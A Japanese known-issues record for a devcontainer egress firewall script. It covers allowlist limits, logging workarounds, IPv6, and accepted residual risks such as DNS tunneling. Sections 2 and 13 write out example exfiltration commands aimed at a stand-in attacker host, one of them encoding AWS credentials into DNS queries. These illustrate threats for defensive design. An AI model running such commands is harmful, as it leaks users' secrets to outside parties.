# 既知の課題・制限

`init-project-firewall.sh` の実装で判明している課題を分類して記録します。

分類:

* **仕様判断待ち** — 実装を変える前に仕様書（[`spec.md`](./spec.md)）側の決定が必要なもの
* **実装の制限** — 現在の方式では原理的に対応できず、将来の構成変更で解消するもの
* **検証待ち** — 実装は済んでいるが、実環境での確認が終わっていないもの
* **受容済み残余リスク** — 対策しないと決めたもの

---

## 1. ワイルドカードドメインが使えない

**分類:** 実装の制限（決定済み）
**優先度:** 対応済み

**決定:** 選択肢 1 を採用 — **v1 ではワイルドカードを拒否する**。実装・テスト・ドキュメントに反映済み

### 何が起きるか

`firewall.json` に `"allowDomains": ["*.neon.tech"]` と書くと、バリデーション段階で拒否され exit≠0 になります。

```
[firewall] ERROR: rejected allowDomains entry: *.neon.tech - wildcards are not supported.
DNS cannot enumerate the subdomains of a zone, so a wildcard cannot be expanded into addresses.
List the host names you need instead; run in audit mode and read ipset egress-audit-v4 to find
out which ones those are.
```

### 原因

allowlist は ipset（L3 の IP アドレス集合）であり、起動時に名前解決した結果を入れる方式です。パケットを見る時点でドメイン名は存在せず、宛先 IP しかありません。

そして **DNS には「あるゾーンのサブドメインを列挙する」手段がありません。** `*.neon.tech` を IP の集合へ展開することは原理的に不可能です。

### なぜ「受理して apex だけ解決」ではないのか

旧実装は受理して `neon.tech` だけを解決し、警告を出していました。これを止めた理由:

**セキュリティ設定において「受理するが実現しない」のは最悪の性質です。** 設定を書いた人は「サブドメイン全体が許可された」と信じ、実際には `db-123.neon.tech` は遮断されます。警告ではこの誤認を防げません。設定ファイルとその効果が食い違う状態を残すより、書けないことを明示して代替を示すほうが安全です。

### 仕様との関係（解消済み）

初版仕様 §3 はワイルドカードを `*.example.com` 形式に限って明示的に許可し、例示も `*.neon.tech` でした。これは実装能力を超えた記述であり、**仕様側の誤り**でした。[`spec.md`](./spec.md) §3.2 / §9.1 で「拒否」に改めています。

### 選択肢（検討時）

1. **L3 実装ではワイルドカードを拒否する** ← **採用**
2. **apex のみを許可する仕様として明記する** — 誤認が残る
3. **スキーマ上は受理し `enforce` で拒否する** — 実質 1 に手順を足しただけ

### 回避策

具体的なホスト名を列挙してください。

```json
{ "version": 1, "allowDomains": ["ep-cool-name-123456.ap-southeast-1.aws.neon.tech"] }
```

必要なホスト名がわからない場合は `mode: "audit"` で運用し、`egress-audit-v4` に溜まった IP から逆引き（または TLS 証明書の SAN）で特定します。

### 解消の見込み

仕様書 §10 の L7 proxy 移行時、スキーマ version 2 で再導入します。proxy であればパケットにドメイン名（SNI / Host ヘッダ）が乗るため、展開せずにマッチできます。

---

## 2. web search 用に「GET を全ドメイン許可」できない

**分類:** 実装の制限（決定済み）
**優先度:** 中（要件自体がほぼ解消したため）

**決定:** **拒否で確定。** GET 全許可は実装しません

**そもそも要件の大半が成立しません。** Claude Code の WebSearch / WebFetch は Anthropic 側で処理が完結し、コンテナから任意ドメインへの egress を必要としません（通信先は `api.anthropic.com` のみ）。egress 規制下でもそのまま使えます。加えて取得内容は Haiku の要約を経由するため、prompt injection のリスクはむしろ低くなります。詳細と実測手順は [`web-search-fetch.md`](./web-search-fetch.md) を参照してください。

コンテナから直接取得する必要が残るのは、原文を逐語で読ませたい場合だけです。そのときは対象ドメインを `allowDomains` に個別追加します（選択肢 1）。本命は L7 proxy（選択肢 2）のままです。

### 起点となった要件

実機検証（項目 4.2）で挙がった問題意識:

* 「web search のため、GET は全ドメインに許可したい」
* 「GitHub を READ 対象としている時点でプロンプトインジェクションの可能性は排除できないため、READ 規制は効果が薄い」

### 切り分け

**後者は正しい。** 仕様書 §1 の Non-goals そのものです。「悪性コンテンツの流入防止はしない。allowlist に GitHub/npm がある時点で任意コンテンツは流入する。INPUT 側フィルタに実効性はなく、目的としない」。現在の実装も INPUT 側で流入を防ごうとはしていません。

**前者は 2 つの理由で成り立ちません。**

#### 理由 1: GET は書き出しチャネルである

`GET https://attacker.example/?data=<APIキー>` の形で、任意の宛先に情報を送り出せます。これを許すと仕様書 §1 の目的 1「漏洩シンクの制限 — injection・暴走時に、コンテナ内の秘密・コードを書き出せる先を allowlist に限定する」が丸ごと無効になります。

仕様書 §1 が残余リスクとして受容しているのは「**許可先への** GET クエリ等による低帯域漏洩」です。全ドメインへの GET とは質が違います。

* 許可先への GET — 宛先が既知（GitHub / npm）、帯域が限られ、ログで追える
* 全ドメインへの GET — 攻撃者が自分のサーバを宛先にできる。追跡も遮断もできない

#### 理由 2: L3 / L4 では実装できない

HTTP メソッドは L7 の概念です。iptables から見えるのは TCP/443 への接続だけで、TLS の中身は不可視です。「GET だけ許可」を L4 で表現すると **443 番ポートの全開放**になり、POST も PUT も同じ経路を通ります。

仕様書 §1 が「L7 制御（メソッド別・パス別の制御）はしない。将来の proxy 移行で扱う（§8）」と明記しているのはこのためで、**現在の実装は仕様どおり**です。仕様不整合ではありません。

### 選択肢

1. **検索 API のドメインだけを allowlist に追加する**（現構成のまま今すぐ可能）

   Brave Search API / Tavily / Google Custom Search など、使う API のドメインを `firewall.json` の `allowDomains` に入れます。エージェントは API 経由で検索し、結果ページを直接フェッチしません。exfil 面は API ドメイン 1 つ分に留まります。

   ```json
   { "version": 1, "allowDomains": ["api.search.brave.com"] }
   ```

2. **L7 proxy を導入する**（仕様書 §10。本命）

   proxy 側で「GET のみ許可・クエリ長制限・全リクエストのログ」を行い、ドメイン ACL も proxy に移します。本スクリプトは「proxy 宛 + DNS 固定のみ許可」に縮小します。構築コストは要りますが、要件を素直に満たせるのはこの構成だけです。

3. **GET 全許可を受け入れる**

   仕様書 §1 の目的 1 を落とす判断です。exfil 防止はクレデンシャル側（prod キー不在、fine-grained PAT）だけで受け止めることになります。採用する場合は**明示的な仕様変更として記録**してください。なし崩しに 443 を開けるのは避けるべきです。

選択肢 3（GET 全許可）は**採用しません**。選択肢 1 を必要時の個別対応、選択肢 2 を本命とします。

---

## 3. 実 netfilter 環境での検証

**分類:** 検証済み（2026-08-02）

Docker Desktop（macOS / arm64、linuxkit カーネル 6.12.76、デフォルトブリッジ）で
[`verification-checklist.md`](./verification-checklist.md) の全 13 項目を実施し、すべて合格しました。

確認できた事項:

* 生成したフィルタテーブルをカーネルが受理する（`iptables-restore` の構文）
* `dig @8.8.8.8` が UDP / TCP とも失敗する
* IPv6 は default DROP（global IPv6 アドレスが無いため到達性テストはスキップ）
* 2 回連続実行でルールセットが完全一致し、2 回目も名前解決と GitHub meta 取得が成功する
* `timeout -s KILL` を 0.05〜2 秒で刻んでも、どの段階で中断してもポリシーは閉じたまま
* 中断後の再実行が収束する
* `ipset swap` による allowlist の差し替え
* `SET` ターゲットによる遮断先の記録（`egress-audit-v4`）

この検証で 5 件の実装上の問題が見つかり、いずれも修正して回帰テストを追加しました。詳細は
[`verification-checklist.md`](./verification-checklist.md) の「実機検証で見つかった問題」を参照してください。

### 未確認のまま残っている事項

* ~~**ユーザー定義ネットワーク上での動作**~~ — **解消**（項目 11。2026-08-03 に checklist 項目 17 で検証済み）
* **IPv6 の実到達性** — 検証環境に global IPv6 アドレスが無いため、`curl -6` による遮断確認はスキップしています
* **Linux ホスト上の Docker** — linuxkit VM 以外での動作は未確認です

---

## 4. LOG がコンテナ内から読めない

**分類:** 対策済み（`LOG` 自体は環境依存のまま）
**優先度:** 解消（遮断先の記録は ipset 経由でコンテナ内から読めます）

**二重に塞がっています。** 読めないだけでなく、既定ではそもそも出力されません。

### 障害 1: コンテナ内の `dmesg` は読めない

iptables の `LOG` ターゲットはホストのカーネルリングバッファに書き込まれます。コンテナ内の `dmesg` は `CAP_SYSLOG` を持たないため失敗します。

```
$ dmesg | tail -5
dmesg: read kernel buffer failed: Operation not permitted
```

### 障害 2: そもそもログが生成されていない

`net.netfilter.nf_log_all_netns` は **既定で 0** です。Linux 4.11 で導入されたこの sysctl は、初期ネットワーク名前空間以外からの netfilter ログを抑制します（コンテナがホストの dmesg を汚染するのを防ぐため）。

実機での確認結果 — audit モードで未許可先に通信した直後にホストから読んでも、`fw-` プレフィックスのログは 1 件もありませんでした。`dmesg` 自体は veth の作成・削除などを正常に出力しており、読み出し経路の問題ではありません。

```sh
docker run --rm --privileged alpine dmesg | grep fw-audit
# （出力なし）
```

つまり **ホストから読んでも解決しません。** 仕様書 §6 が想定する「audit モードで数日回し、ログから必要ドメインを収集する」という運用は、追加の設定なしには成立しません。

### 回避策 A: `nf_log_all_netns` を有効にする

```sh
docker run --rm --privileged alpine sysctl -w net.netfilter.nf_log_all_netns=1
```

その後、ホストから読みます。

```sh
# Linux ホスト
sudo dmesg -w | grep -E 'fw-(audit|drop|drop6|dns-drop):'

# Docker Desktop（macOS / Windows）
docker run --rm --privileged alpine dmesg -w | grep -E 'fw-(audit|drop|drop6|dns-drop):'
```

難点:

* VM / ホストの再起動で 0 に戻るため、恒久運用には永続化の仕組みが要る
* **すべてのコンテナ**の netfilter ログがホストの dmesg に混ざる
* ログの読み出しがコンテナ外の作業になり、開発フローから切り離される

`justincormack/nsenter1` は amd64 専用イメージのため、Apple Silicon など arm64 環境では `execve: No such file or directory` になります。privileged コンテナ自体が `CAP_SYSLOG` を持つため、`nsenter` は不要です。

### 採用しなかった案

* **`--cap-add=SYSLOG` を devcontainer に付与する** — コンテナ内から `dmesg` が読めるようになりますが、カーネルリングバッファは名前空間化されていないため、**ホストと他コンテナのカーネルログがすべて LLM エージェントから読めるようになります**。egress を絞る目的と正面から衝突するため採用しません。

### 採用した対策: 遮断先を ipset に記録する（実装済み）

`LOG` に依存せず、iptables の `SET` ターゲットで遮断された宛先 IP を専用 ipset に蓄積します。

```
-A OUTPUT -m set --match-set egress-allow-v4 dst -j ACCEPT
-A OUTPUT -j SET --add-set egress-audit-v4 dst --exist    ← non-terminating
-A OUTPUT -m limit ... -j LOG --log-prefix "fw-drop: "
-A OUTPUT -j REJECT --reject-with icmp-admin-prohibited
```

```sh
ipset list egress-audit-v4
```

* **ホスト側の設定に依存しない** — `nf_log_all_netns` も `CAP_SYSLOG` も不要
* **追加パッケージ不要** — `ip_set` は allowlist で既に使っています
* **コンテナ内で完結する** — 仕様書 §6 の運用フローが成立します
* **enforce モードでも記録される** — `dmesg` が読めない環境でのトラブルシュートに使えます
* エントリは 7 日でタイムアウト。set はスクリプト再実行でも作り直しません（蓄積が目的）

限界:

* **IP しか分かりません。** 時刻・ポート・プロトコルは記録されません。逆引き（`dig -x`）で補ってください
* `SET` ターゲットが使えないカーネルでは、記録ルールを外した構成に自動でフォールバックします（`retrying without the blocked-destination recorder` が出ます）

`LOG` ルールは残してあります。害がなく、出力される環境では時刻とポートも取れるためです。ただし**運用の前提にはしません**。

### 見送った案: `NFLOG` に移行する

`LOG` の代わりに `NFLOG`（`-j NFLOG --nflog-group N`）を使います。`nfnetlink_log` はネットワーク名前空間に対応しており、**`nf_log_all_netns` の制約を受けません**。`CAP_NET_ADMIN`（既に付与済み）だけでコンテナ内から読めます。

```
-A OUTPUT -m limit --limit 5/min -j NFLOG --nflog-group 1 --nflog-prefix "fw-audit: "
```

```sh
tcpdump -i nflog:1
```

利点:

* ログの読み出しがコンテナ内で完結する。仕様書 §6 の運用フローがそのまま成立する
* ホストの dmesg を汚さない
* ホスト側の sysctl 変更が不要

必要な作業:

* Dockerfile に `tcpdump` を追加（libpcap の NFLOG 対応が要る）
* `log_line` の生成を `LOG` から `NFLOG` に切り替え
* コンテナ内での実挙動の検証（未実施）

時刻・ポートまで必要になった場合の次善策として残しておきます。ipset 記録で足りているうちは、`tcpdump` の追加とカーネルモジュール依存を増やすだけの価値はありません。

### 実機での確認結果

```
$ docker run --rm --privileged --net=host alpine sysctl net.netfilter.nf_log_all_netns
net.netfilter.nf_log_all_netns = 0

$ docker run --rm --privileged --net=host alpine sh -c 'lsmod | grep -iE "nf_log|nfnetlink_log|xt_LOG"'
（出力なし）
```

`nf_log_all_netns` は init_net にのみ登録される sysctl のため、`--net=host` を付けないと `unknown key` になります。値は既定の 0 でした。

---

## 5. `chattr +i`（immutable）を付与できない

**分類:** 決定済み（仕様書の修正待ち）
**決定:** 選択肢 1 を採用 — **仕様書から immutable 要件を外す**。防御価値が限定的なもののために複雑性を増やさない

### 何が起きるか

仕様書 §2.1 は「`/usr/local/bin` のコピーを root 所有かつ immutable にする」ことを求めていますが、**Docker のデフォルト capability セットに `CAP_LINUX_IMMUTABLE` が含まれません**。`docker build` の `RUN` は root で実行されますが capability セットは同じであるため、ビルド時であっても `chattr +i` は失敗します。

overlayfs が `FS_IOC_SETFLAGS` を通さない問題もこれに重なります。

実機での確認結果:

```
$ lsattr /usr/local/bin/init-project-firewall.sh
--------------e------- /usr/local/bin/init-project-firewall.sh
```

`e` は extent format を示すフラグで、immutable とは無関係です。

### 影響

権限昇格経路としては塞がっています。実際に成立している防御は次のとおりです。

* ファイルは `root:root` 所有・`755`。`node` に書き込み権限がない（実機で `Permission denied` を確認）
* `node` は `/usr/local/bin` に書き込めない
* `node` に許可された sudo は当該スクリプトの引数なし実行のみ。`chattr` も `cp` も実行できない

`chattr +i` が守るのは「root 権限を取った攻撃者による書き換え」ですが、root を取られた時点で `chattr -i` も実行できるため、そもそもこの経路での防御価値は限定的です。

### 選択肢

1. **仕様書から immutable 要件を外す** — 現実に達成できず、防御価値も限定的であるため
2. **`--cap-add=LINUX_IMMUTABLE` を付与する** — devcontainer に capability を 1 つ足すことになる。ファイルシステムが overlayfs の場合はそれでも失敗する可能性がある
3. **現状維持** — README のとおり `|| echo WARNING` で失敗を許容し、付けば儲けものとして扱う

### 決定と、必要な変更

**選択肢 1 を採用。** 防御価値が限定的なもののために複雑性を増やさない、という判断です。

反映済み:

* README のセットアップ手順から `chattr +i` の項を削除し、「配置を検証する」に置き換え
* 実装は元々 `chattr` を呼んでいないため変更なし

**仕様書側に未反映の変更が残っています:**

* §2「権限モデル」の手順 1 — 「可能なら `chattr +i`」を削除
* §9 受け入れ基準 — 「sudoers が固定パス・引数なしで、対象が root 所有 immutable」から immutable を外し、「root 所有・`755`・非特権ユーザーから書き換え不可」に改める

判定は「root 所有・`755`・node から書き換え不可」で行ってください。

---

## 6. 許可先経由の低帯域 exfil

**分類:** 受容済み残余リスク（仕様書 §7.8）

allowlist に GitHub や npm がある以上、以下は egress 制御では防げません。

* 許可済みドメインへの GET クエリパラメータに情報を載せる形での低帯域漏洩
* 書き込み権限を持つ GitHub トークンがある場合の、github.com 経由の持ち出し

対策は egress ではなくクレデンシャル側です。fine-grained PAT を使う、prod キーをコンテナに置かない、といった運用で受け止めます。

---

## 7. 適用前に確立された接続の継続

**分類:** 実装の制限

最終的なフィルタテーブルは `ESTABLISHED,RELATED` を ACCEPT します（そうしないと通常の通信が成立しません）。そのため、**スクリプト適用前に確立されていた allowlist 外への TCP 接続は、適用後も継続できます**。

ただし以下の緩和があります。

* **DNS だけは例外** — 53 番宛の DROP ルールを汎用の ESTABLISHED ACCEPT より**前**に置いているため、適用前に張られた外部 DNS のフローは遮断されます
* **失敗時の panic テーブルには OUTPUT の ESTABLISHED 許可がありません** — 適用に失敗した場合は、既存の接続も含めて遮断されます

`postStartCommand` はコンテナ起動直後、エージェントが動き出す前に実行されるため、実運用での影響は限定的です。

---

## 8. インストール時のチェックサム検証がない

**分類:** 実装の制限（仕様書 §7 の 4）

スクリプトは root で動作します。パッケージの改竄に対しては、プライベートレジストリと lockfile の固定に依存しており、`/usr/local/bin` へのコピー時にチェックサムを検証する仕組みは入っていません。

将来的にはイメージビルド時のハッシュ検証を入れることが望ましい状態です。

---

## 9. ポリシー変更にイメージ再ビルドが要る

**分類:** 受容済み（設計上のトレードオフ）

適用時に読まれる `firewall.json` は `/etc/egress-guard/firewall.json`（root 所有）だけです。repo 側の `.devcontainer/firewall.json` はソースであり、イメージを再ビルドしないと反映されません。

**理由:** エージェントは sudoers により再適用を実行できます。再適用が読むファイルをエージェントが書き換えられるなら、`{"mode":"audit"}` と書いて `sudo` を打つだけで、root を取らずにポリシー全体が無効になります。詳細は仕様書 §2.1。

**コスト:** `audit` モードで許可先を収集しながら `firewall.json` を育てるフェーズで、1 回の追記ごとに再ビルドが必要になります。

**受容の理由:** audit の収集は人間が回すフェーズであり、再解決（CDN の IP 変動への追随）は再適用だけで済むため、日常運用の頻度は上がりません。

**回避策（開発時のみ）:** 内容の検証だけなら再ビルド不要です。

```sh
init-project-firewall.sh --check-config
```

---

## 10. `host.docker.internal` を許可する必要性（検証済み）

**分類:** 検証済み（2026-08-03、Docker Desktop / macOS / デフォルトブリッジ）

`allowHostPorts` はデフォルトゲートウェイと `host.docker.internal` の**両方**を許可対象にします。

**この 2 つが別アドレスであることは実機で確認できました**（[checklist 15.1](./verification-checklist.md)、Docker Desktop / macOS）。

```
[firewall] host gateway candidate 192.168.65.254 (host.docker.internal)
[firewall] allowed host 172.17.0.1 192.168.65.254 on ports: 15432

-A OUTPUT -d 172.17.0.1/32 -p tcp -m tcp --dport 15432 -j ACCEPT
-A OUTPUT -d 192.168.65.254/32 -p tcp -m tcp --dport 15432 -j ACCEPT
```

### ホストへの到達はゲートウェイ経由では成立しない

checklist 15.2b でホスト上の HTTP サーバへ接続し、パケットカウンタを確認しました。

```
11       0     0 ACCEPT  tcp  0.0.0.0/0  172.17.0.1       tcp dpt:15432
12       1    60 ACCEPT  tcp  0.0.0.0/0  192.168.65.254   tcp dpt:15432
```

**ゲートウェイ（`172.17.0.1`）側は `pkts 0` です。** 到達は `host.docker.internal` のアドレス経由でしか成立していません。ゲートウェイのみを許可していた旧実装では、ホスト上のローカル DB に届かなかったことが実測で確定しました。

`egress-audit-v4` は空のままで、遮断は発生していません。

`host.docker.internal` が**公開アドレスを返した場合にポートを開かない**ことは、実機では再現できませんでした（偽の DNS 応答を作れないため。checklist 18.4）。`tests/firewall-rules.test.sh` の `hostpublic` ケースで担保しています。

ポート単位で効いていることも確認済みです（checklist 15.3）。同じ宛先アドレスでも、許可ポートは `exit=0`、非許可ポートは `exit=7` かつ `egress-audit-v4` に記録されます。

### 検証時の落とし穴

初回は 3 経路とも `curl: (7) ... after 5 ms` で失敗し、firewall を疑いました。**原因はホスト側の `python3 -m http.server` が `::` にバインドしていたこと**です（`--bind 0.0.0.0` で解決）。

**firewall の `REJECT` も即座に exit 7 を返すため、exit コードだけでは区別できません。** 切り分けには `iptables -L OUTPUT -v -n` のパケットカウンタと `egress-audit-v4` を使ってください。許可された宛先は ACCEPT で終端して audit set に記録されず、遮断された宛先だけが記録されるため、firewall 起因かどうかが確実に分かります。手順は checklist 15.2b。

---

---

## 11. 推奨構成（ユーザー定義ネットワーク）での動作

**分類:** 検証済み（2026-08-03、Docker Desktop / macOS、ネットワーク `egress-guard-toganashi`）

当初はデフォルトブリッジでのみ検証しており、**README が推奨している構成のほうが未検証**という優先度の反転が起きていました。[checklist 項目 17](./verification-checklist.md) で解消しました。

### 確認できた事項

* **埋め込みリゾルバが使われる** — `/etc/resolv.conf` が `nameserver 127.0.0.11` になり、デフォルトブリッジで出ていた警告 2 行が消える
* **nat テーブルの Docker DNS DNAT が壊れない**（最大の未知だった項目）

  ```
  # 適用前後の diff
  IDENTICAL

  -A OUTPUT -d 127.0.0.11/32 -j DOCKER_OUTPUT
  -A DOCKER_OUTPUT -d 127.0.0.11/32 -p tcp -m tcp --dport 53 -j DNAT --to-destination 127.0.0.11:36265
  -A DOCKER_OUTPUT -d 127.0.0.11/32 -p udp -m udp --dport 53 -j DNAT --to-destination 127.0.0.11:38180
  -A DOCKER_POSTROUTING -s 127.0.0.11/32 -p tcp -m tcp --sport 36265 -j SNAT --to-source :53
  -A DOCKER_POSTROUTING -s 127.0.0.11/32 -p udp -m udp --sport 38180 -j SNAT --to-source :53
  ```

  **「nat を触らない」という設計判断が、それが実際に意味を持つ唯一の構成で裏付けられました。** 初版仕様は nat を flush して Docker の DNS ルールを退避・復元する方式でしたが、その複雑性は不要でした（[spec.md](./spec.md) §11）。

* **ゲートウェイの変化に追随する** — `172.17.0.1` → `172.20.0.1`。`ip route` から検出しているため設定変更は不要
* **`host.docker.internal` の解決経路は変わらない** — `192.168.65.254` を返し、`curl` で `200`。項目 15 の結論はこの構成でも同じ。なお項目 18.4 で、**この名前は `/etc/hosts` ではなく DNS で解決されている**ことが判明しました（`resolve_domain` は `dig` を先に試し、Docker Desktop のリゾルバがこの名前に応答するため `getent` に到達しません）。デフォルトブリッジでもユーザー定義ネットワークでも同じです
* **名前指定でも足踏みしない** — `http://host.docker.internal:15432/` が 0.048 秒で `200`（項目 12）
* **冪等性・DNS 固定・default policy** — いずれも再実施して合格
* **デフォルトブリッジへ戻せる** — 適用は成功し、警告 2 行が再び出る。**推奨構成は必須要件ではない**という位置づけが両方向で成立

### 副産物: DNS の上流転送がデーモン側で起きている証跡

ユーザー定義ネットワーク上の `/etc/resolv.conf` にコメントが出ます。

```
nameserver 127.0.0.11
options ndots:0

# Based on host file: '/etc/resolv.conf' (internal resolver)
# ExtServers: [host(192.168.65.7)]
```

`ExtServers` がホストのリゾルバを指しています。**埋め込みリゾルバは上流への転送をデーモン側（ホストの netns）で行う**ため、コンテナの OUTPUT チェーンは上流パケットを見ません。項目 13（DNS トンネリングが防げない理由）の裏付けでもあります。

---

## 12. AAAA を持つ許可先への接続が IPv6 で足踏みする可能性

**分類:** 実測済み（現構成では発生しない）／IPv6 有効なコンテナでは未確認

IPv6 は**全 DROP**です。DROP は ICMP を返さないため、クライアントから見ると「無応答」になり、タイムアウトするまで待たされます。

一方、許可したホスト名が AAAA レコードを持っていると、クライアントは RFC 6724 に従って**先に IPv6 を試します**。つまり次の経路があり得ます。

```
名前解決 → AAAA を得る → IPv6 で接続 → DROP（無応答）→ タイムアウト待ち
          → A にフォールバック → IPv4 で接続成功
```

**接続はするが、毎回タイムアウト分だけ遅くなる**という失敗の仕方です。

### 気付いたきっかけ

checklist 15.2 で `getent hosts host.docker.internal` が IPv6（ULA）を返しました。

```
fdc4:f303:9324::254 host.docker.internal
```

スクリプト自身は `getent ahostsv4` を使っているため IPv4（`192.168.65.254`）を得ており、**ルール生成は正しい**です。問題になるとすれば、コンテナ内のアプリケーションが名前で接続するときです。

### 実測結果: この環境では発生しない（2026-08-03）

[checklist 15.2](./verification-checklist.md) の「名前で接続した場合」を実施しました。

```
⬢ [Docker] ❯ ip -6 addr show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN qlen 1000
    inet6 ::1/128 scope host

⬢ [Docker] ❯ time curl ... http://host.docker.internal:15432/
curl -sS -o /dev/null ...   0.039 total
```

**コンテナに IPv6 アドレスが `lo` の `::1` しかありません。** eth0 にグローバルも ULA も無いため、`getaddrinfo` の address-config によって AAAA は使われず、名前接続は **0.039 秒**で完了しています（接続自体は別要因で失敗していますが、待たされてはいません）。

実機検証（項目 4、13）で `api.anthropic.com` も `git fetch` も `pnpm install` も正常な速度で通っていたのと整合します。

### 残っている未確認範囲

ユーザー定義ネットワーク上でも再確認済みです（checklist 17.5）。`http://host.docker.internal:15432/` が **0.048 秒**で `200` を返し、足踏みは起きていません。

**コンテナに IPv6 アドレスが割り当てられる構成では未確認です。** Docker の IPv6 有効化（`--ipv6` / `enable_ipv6`）や、IPv6 を持つユーザー定義ネットワークを使う場合は再確認が必要です。その構成では AAAA が実際に試行され、DROP による足踏みが起こり得ます。

### 対策案（該当する構成が出てきたら判断）

IPv6 の OUTPUT にも明示的な `REJECT` を置き、IPv4 と同じ扱いにします。

```
-A OUTPUT -j REJECT --reject-with icmp6-adm-prohibited
```

現在 IPv4 の未許可先は `REJECT --reject-with icmp-admin-prohibited` で即座に落としているのに対し、**IPv6 だけが DROP という非対称**になっています。REJECT にすればフォールバックが即座に起こり、遮断の強度は変わりません（コンテナ自身への ICMP なので情報漏洩にもなりません）。

**実装しません。** 現構成では問題が発生しないことを実測で確認しており、IPv6 テーブルは項目 5 で検証済みです。発生していない問題のために変更して再検証を強いるのは筋が悪いためです。IPv6 が有効なコンテナを使う判断をした時点で再検討してください。

---

## 13. DNS トンネリングは防げない

**分類:** 受容済み残余リスク

### 何が防げていて、何が防げていないか

53 番の宛先は、コンテナに割り当てられたリゾルバ 1 つに固定しています。

**防げる:** 攻撃者が用意したネームサーバーへ直接問い合わせる経路。`dig @attacker.example ...` は DROP され、`egress-audit-v4` に記録されます（checklist 16 で実測済み）。

**防げない: トンネリング本体。** 許可されたリゾルバは**再帰問い合わせ**をするため、次が成立します。

```sh
dig "$(base64 < ~/.aws/credentials | tr -d '\n' | cut -c1-60).exfil.attacker.example"
```

問い合わせは正規のリゾルバへ向かい、リゾルバが上流へ転送し、攻撃者の権威ネームサーバーにラベルが届きます。TXT レスポンスで戻りチャネルも作れます。tcp/53 を許可しているため帯域も出ます。

**埋め込みリゾルバ `127.0.0.11` でも同じです。** Docker デーモンがホスト側の netns から上流へ転送するため、コンテナの OUTPUT チェーンは上流パケットを一切見ません。リゾルバの選択では解決しません。

### 記述の訂正（2026-08-03）

README と仕様書は当初これを「**DNS トンネリングの遮断**」と書いていました。**過大な主張**でした。実際に得られている性質は「DNS の経路を 1 つに固定し、それ以外の試行を遮断・記録すること」です。

* README「できること」→「**DNS 経路の固定**」に変更し、防げない旨を併記
* README「できないこと」に項目を追加
* 仕様書 §1 の目的 2 を同様に修正

### 対策の選択肢（未実装）

1. **L7 proxy へ移行する**（[spec.md](./spec.md) §10）。DNS も proxy 側で解決させ、問い合わせ先ゾーンを allowlist で制限する
2. **DNS フィルタを挟む** — 応答するゾーンを allowlist に限定するリゾルバ（dnsmasq の `server=` / `address=`、CoreDNS のポリシー等）をコンテナ側リゾルバとして立てる。L3 のままでも実現できるが、コンテナごとにリゾルバを運用する複雑性が増える
3. **クエリ長・レートで検出する** — 遮断ではなく検知。`egress-audit-v4` には残らない（正規リゾルバ宛のため）ので、別の観測点が要る

### なぜ受容するか

* このスクリプトの目的は「漏洩先の限定」であり、「あらゆる低帯域チャネルの遮断」は Non-goal（[spec.md](./spec.md) §1）。項目 6 と同じ位置づけ
* 完全な遮断には L7 か DNS 層の追加コンポーネントが要り、L3/L4 の範囲では原理的に届かない
* 受け止めはクレデンシャル側（prod キーを置かない、fine-grained PAT）で行う前提

---

## 14. 実効設定の検査は競合する攻撃者には勝てない

**分類:** 受容済み残余リスク

スクリプトは起動時に自身と設定ファイルの配置を検査します。**利用者に `ls -l` による手動確認を求めない代わりの仕組み**です。

`assert_script_is_root_owned` は、`SUDO_USER` / `SUDO_UID` がある場合に**スクリプト自身**が root 所有かつ group/other 書き込み不可であることを検査します。sudoers が `node_modules` 内のパスを指す誤設定を捕まえるためのものです。**ただし、悪意をもって差し替えられたスクリプトに対しては無意味です**（差し替えた側が検査コードごと削除できます）。捕まえられるのは設定ミスだけです。

`assert_config_is_root_owned` は `/etc/egress-guard/firewall.json` について次を検査します。

* symlink でないこと（`stat` は追跡するため、root 所有の symlink はすべての検査をすり抜ける）
* 親ディレクトリ `/etc/egress-guard` が root 所有かつ group/other 書き込み不可であること（書き込める親は、ファイルを unlink して自分のものを置くことを許す）
* ファイル自身が root 所有かつ group/other 書き込み不可であること

### 防げないこと

**検査と読み取りの間の差し替え（TOCTOU）です。** ファイルはパス名で複数回開き直されます。

1. `-L` / `stat`（所有者）/ `stat`（モード）
2. `stat`（サイズ）
3. 複数回の `jq`

閉じるには 1 つの fd を開いたまま全ての読み取りをそこから行う必要がありますが、**bash では表現できません**（`jq` にファイル記述子経由で渡すことはできても、`stat` 相当の検査を同じ inode に対して行い続ける保証が作れない）。

### なぜ受容するか

* **防いでいる対象は誤設定です。** ワークスペースのファイルを `/etc/egress-guard/firewall.json` に bind mount する、といった構成ミスは確実に止まります
* 競合を成立させるには、まず親ディレクトリへの書き込み権限が要ります。Dockerfile が `root:root` / `755` で配置していれば、非特権ユーザーにその権限はありません
* bind mount / FUSE 系では所有者・モードと実際の書き込み可否が一致しないことがあり、そこは検査で保証できません

### 強くするなら

コンテナの entrypoint で**起動時点から最小 DROP ポリシーを適用**し、本スクリプトはそこから展開する方式にすると、検査の失敗が「開いたまま」に繋がる経路そのものが消えます。現在は適用フェーズを設定読み込みより前に開始することで、失敗時に panic テーブルへ倒す形で近似しています（[spec.md](./spec.md) §4.6）。
